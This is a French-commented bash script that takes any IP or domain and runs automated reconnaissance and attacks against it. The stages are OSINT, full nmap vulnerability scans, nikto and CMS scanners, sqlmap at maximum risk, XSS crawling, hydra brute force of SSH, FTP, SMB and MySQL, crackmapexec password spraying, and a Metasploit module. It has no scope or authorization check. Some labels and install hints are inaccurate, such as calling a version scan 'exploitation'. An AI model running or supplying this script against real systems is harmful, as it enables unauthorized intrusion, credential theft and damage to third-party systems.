#!/bin/bash

# Vérification des outils nécessaires
check_tools() {
    tools=("whois" "dig" "nslookup" "theHarvester" "subfinder" "amass" "crtsh" "shodan" "waybackurls" "gobuster" "whatweb" "nmap" "nikto" "wpscan" "joomscan" "droopescan" "sqlmap" "xsstrike" "hydra" "crackmapexec" "searchsploit" "msfconsole")
    echo "🔍 Vérification des outils nécessaires..."
    for tool in "${tools[@]}"; do
        if ! command -v $tool &> /dev/null; then
            echo "❌ Outil manquant : $tool. Installe-le avec : sudo apt install $tool"
        fi
    done
}

check_tools

# Demande de la cible
echo "Entrez l'IP ou le domaine cible :"
read cible

# Vérification de la saisie
if [ -z "$cible" ]; then
    echo "❌ Cible non spécifiée."
    exit 1
fi

# Création du dossier de stockage des résultats
mkdir -p reconnaissance_$cible
cd reconnaissance_$cible || exit

echo "🚀 Démarrage de la reconnaissance passive et active sur $cible"

#=======================
# 🔥 RECONNAISSANCE PASSIVE
#=======================

echo "🔍 1. WHOIS Lookup"
whois $cible > whois_results.txt
echo "✅ WHOIS terminé."

echo "🔍 2. Recherche DNS (Subdomain Enumeration)"
dig $cible any > dig_results.txt
nslookup $cible > nslookup_results.txt
subfinder -d $cible -o subfinder_results.txt
amass enum -passive -d $cible > amass_results.txt
echo "✅ Recherche DNS terminée."

echo "🔍 3. Recherche de certificats (crt.sh)"
curl -s "https://crt.sh/?q=$cible&output=json" | jq . > crtsh_results.json
echo "✅ Recherche de certificats terminée."

echo "🔍 4. Recherche Shodan"
shodan host $cible > shodan_results.txt
echo "✅ Recherche Shodan terminée."

echo "🔍 5. Recherche sur Wayback Machine"
waybackurls $cible > wayback_results.txt
echo "✅ Wayback Machine terminé."

echo "🔍 6. OSINT (Emails, réseaux sociaux, fuites de données)"
theHarvester -d $cible -b all -f theHarvester_results.txt
echo "✅ OSINT terminé."

#=======================
# 🔥 RECONNAISSANCE ACTIVE
#=======================

echo "🔍 7. Scan Nmap avancé (ports et services)"
nmap -A -T4 -p- --script=vuln $cible -oN nmap_full.txt
echo "✅ Scan Nmap terminé."

echo "🔍 8. Détection d'OS et versions (Nmap OS Scan)"
nmap -O $cible -oN nmap_os.txt
echo "✅ Détection OS terminée."

echo "🔍 9. Scan des technologies Web"
whatweb -v $cible > whatweb_results.txt
echo "✅ Technologies Web identifiées."

echo "🔍 10. Scan de vulnérabilités Web"
nikto -h $cible > nikto_results.txt
echo "✅ Scan de vulnérabilités Web terminé."

echo "🔍 11. Scan CMS (WordPress, Joomla, Drupal)"
wpscan --url $cible --enumerate vp > wpscan_results.txt
joomscan --url $cible > joomscan_results.txt
droopescan scan drupal -u $cible > droopescan_results.txt
echo "✅ Scan CMS terminé."

echo "🔍 12. Scan SQL Injection"
sqlmap -u "http://$cible" --batch --risk=3 --level=5 --dbs > sqlmap_results.txt
echo "✅ Scan SQL Injection terminé."

echo "🔍 13. Scan XSS"
xsstrike -u "http://$cible" --crawl --level 3 > xsstrike_results.txt
echo "✅ Scan XSS terminé."

echo "🔍 14. Recherche de failles connues (Exploit-DB)"
searchsploit $cible > searchsploit_results.txt
echo "✅ Recherche de failles connues terminée."

#=======================
# 🔥 BRUTEFORCE & EXPLOITATION
#=======================

echo "🔍 15. Bruteforce des services"
hydra -L users.txt -P passwords.txt $cible ssh -o hydra_ssh.txt
hydra -L users.txt -P passwords.txt $cible ftp -o hydra_ftp.txt
hydra -L users.txt -P passwords.txt $cible smb -o hydra_smb.txt
hydra -L users.txt -P passwords.txt $cible mysql -o hydra_mysql.txt
echo "✅ Bruteforce terminé."

echo "🔍 16. CrackMapExec (Post-exploitation rapide)"
crackmapexec smb $cible -u users.txt -p passwords.txt > cme_smb_bruteforce.txt
crackmapexec ssh $cible -u users.txt -p passwords.txt > cme_ssh_bruteforce.txt
echo "✅ CrackMapExec terminé."

echo "🔍 17. Exploitation automatique Metasploit"
msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set RHOSTS $cible; run; exit" > metasploit_smb.txt
echo "✅ Exploitation Metasploit terminée."

#=======================
# 🎯 CONCLUSION
#=======================
echo "🎯 Scan terminé ! Les résultats sont enregistrés dans reconnaissance_$cible"

